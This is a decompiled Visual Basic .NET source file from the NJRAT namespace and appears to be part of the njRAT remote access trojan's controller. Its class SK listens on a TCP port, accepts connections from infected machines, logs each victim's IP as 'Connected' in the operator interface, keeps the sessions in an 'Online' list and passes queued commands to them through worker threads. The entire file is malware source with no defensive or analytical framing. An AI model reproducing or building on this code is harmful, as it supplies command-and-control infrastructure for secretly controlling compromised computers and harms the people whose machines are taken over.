﻿Imports System
Imports System.Collections.Generic
Imports System.Drawing
Imports System.Net.Sockets
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports NJRAT.NJRAT

Namespace NJRAT.njRAT
	' Token: 0x0200003D RID: 61
	Public Class SK
		' Token: 0x060005FB RID: 1531 RVA: 0x00036B50 File Offset: 0x00034D50
		Public Sub New(port As Integer)
			Me.bool_0 = False
			Me.Online = New Collection()
			Me.S = New TcpListener(port)
			Me.S.Server.SendTimeout = -1
			Me.S.Server.ReceiveTimeout = -1
			Me.S.Server.SendBufferSize = 524288
			Me.S.Server.ReceiveBufferSize = 524288
			Me.S.Start(9999)
			ThreadPool.SetMinThreads(250, 250)
			ThreadPool.SetMaxThreads(250, 250)
			Me.Online = New Collection()
			Me.REQ = New List(Of GClass12)()
			Dim num As Integer = 0
			Do
				Me.S.BeginAcceptTcpClient(AddressOf Me.accept, Nothing)
				num += 1
			Loop While num <= 10
			Dim num2 As Integer = 1
			Do
				Dim thread As Thread = AddressOf Me.lam__7
				thread.Start(num2)
				num2 += 1
			Loop While num2 <= 16
		End Sub

		' Token: 0x060005FC RID: 1532 RVA: 0x00003A03 File Offset: 0x00001C03
		Private Sub lam__7(object_0 As Object)
			Me.tp(Conversions.ToInteger(RuntimeHelpers.GetObjectValue(object_0)))
		End Sub

		' Token: 0x060005FD RID: 1533 RVA: 0x00036C6C File Offset: 0x00034E6C
		Public Sub accept(ar As IAsyncResult)
			Try
				Dim client As Client = New Client(Me.S.EndAcceptTcpClient(ar), Me)
				client.Client.ReceiveTimeout = -1
				client.Client.SendTimeout = -1
				client.Client.SendBufferSize = 524288
				client.Client.ReceiveBufferSize = 524288
				If Class7.class8_0.bool_2 Then
					Class7.form1_0.Pp1.WRT(New Object() { Color.LightSteelBlue, Class6.smethod_13(), client.COI, Color.GreenYellow, client.ip(), "Connected" })
				End If
				Dim online As Collection = Me.Online
				Dim obj As Collection = online
				SyncLock obj
					Me.Online.Add(client, client.ip(), Nothing, Nothing)
				End SyncLock
			Catch ex As Exception
			End Try
			Thread.Sleep(1)
			Me.S.BeginAcceptTcpClient(AddressOf Me.accept, Nothing)
		End Sub

		' Token: 0x060005FE RID: 1534 RVA: 0x00036D9C File Offset: 0x00034F9C
		Public Function GetClient(ID As String) As Client
			Dim online As Collection = Me.Online
			Dim result As Client
			SyncLock online
				Try
					result = CType(Me.Online(ID), Client)
				Catch ex As Exception
					result = Nothing
				End Try
			End SyncLock
			Return result
		End Function

		' Token: 0x060005FF RID: 1535 RVA: 0x00036E00 File Offset: 0x00035000
		Public Sub tp(i As Integer)
			While True
				Thread.Sleep(1)
				Dim gclass As GClass12 = Nothing
				Dim req As List(Of GClass12) = Me.REQ
				Dim obj As List(Of GClass12) = req
				SyncLock obj
					If Me.REQ.Count > 0 Then
						gclass = Me.REQ(0)
						Me.REQ.RemoveAt(0)
					End If
				End SyncLock
				If gclass IsNot Nothing Then
					Class7.smethod_5(New Object() { gclass.client_0, gclass.byte_0 })
					gclass.bool_0 = True
				End If
			End While
		End Sub

		' Token: 0x04000338 RID: 824
		Private bool_0 As Boolean

		' Token: 0x04000339 RID: 825
		Public Online As Collection

		' Token: 0x0400033A RID: 826
		Public REQ As List(Of GClass12)

		' Token: 0x0400033B RID: 827
		Public S As TcpListener
	End Class
End Namespace
